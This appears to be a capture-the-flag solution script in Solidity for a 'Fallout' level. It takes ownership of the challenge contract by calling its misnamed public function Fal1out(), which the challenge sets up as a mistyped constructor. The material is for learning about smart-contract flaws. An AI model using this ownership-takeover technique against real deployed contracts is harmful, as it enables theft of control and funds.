// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IFallout.sol";

contract SolveLevel2 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0xD2e5e0102E55a5234379DD796b8c641cd5996Efd;
        value = 0;
    }

    function solveLevel(address instanceAddress) internal override {
        IFallout instance = IFallout(instanceAddress);

        instance.Fal1out();
    }
}
